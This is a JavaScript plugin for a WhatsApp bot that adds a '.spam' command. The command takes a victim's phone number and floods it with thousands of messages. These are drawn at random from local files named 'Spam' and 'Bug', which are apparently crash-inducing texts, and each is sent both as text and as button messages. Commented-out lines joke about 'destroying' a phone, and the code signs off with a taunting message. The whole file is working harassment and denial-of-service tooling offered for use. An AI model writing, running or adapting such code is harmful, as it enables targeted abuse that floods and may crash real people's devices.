import { time } from 'console';
import fs from 'fs'
import moment from 'moment-timezone'

let handler = async (m, { conn, args , command, text, usedPrefix }) => {


let victim = text.split("/")[0]
let count = text.split("/")[1]


if (!victim) throw `! Enter Victim number and count correctly [ ex :- .spam 94778115292/2000 ] (Default count is 1000)`

if (!count) { count = 1000}

if (victim.includes (` `)) throw `no spaces`
//if (victim.length > 11) throw `! Incorrect Number`
//if (victim.length < 11) throw `! Incorrect Number`

/*if (victim.includes (`5292`)) throw `Are You Kidding me ?`
 if (victim.includes (`1056`)) throw `Are you going to destroy Dilshan's samsung galaxy s10+ ? It's not possible`
//if (victim.includes (`5292`)) throw `Are you going to destroy Dilshan's samsung galaxy s10+ ? It's not possible`
if (victim.includes (`7665`)) throw `Nice try :-) try again later` 
if (victim.includes (`1095`)) throw `This is my number , fuck ?` */




let spams = ['./Spam/text/s.txt','./Spam/text/Bug 02.txt','./Spam/text/Bug 03.txt','./Spam/text/Bug 04.txt' , './Spam/text/Bug 05.txt' , './Spam/text/Spam 01.txt' , './Spam/text/Spam 03.txt']

let victim2 = victim.replace(/[^0-9]/g, '')+'@s.whatsapp.net'

let i2 = 0

await conn.sendMessage(m.chat, { text : `Sending ${count *2} Spams to wa.me/${victim}` } , { quoted: m } )

while (i2 < count * 2 ) {


    let spam1 =  spams[Math.floor(Math.random() * spams.length)]


let textx = fs.readFileSync(`${spam1}`)

    

    //await conn.sendText(victim2, textx)
    
   await conn.sendMessage(victim2, { text : textx })
   await conn.sendButton(victim2, `${textx}`, `${textx}`, [`${textx}`, `${textx}`], m)


    //await conn.sendText(group2, textx)
    // conn.sendText(m.chat, textx , m)

    
    i2++
 


}


await conn.sendMessage(victim2, { text : `Spaamed by FUCKERZ COMMIUNITY ~ Powered by Jayarathne Technical`  })



await conn.sendMessage(m.chat, { text : `Succesfully sent ${count * 2} spam to number/${victim}` } , { quoted: m } )










}



handler.command = /^(spam)$/i

export default handler

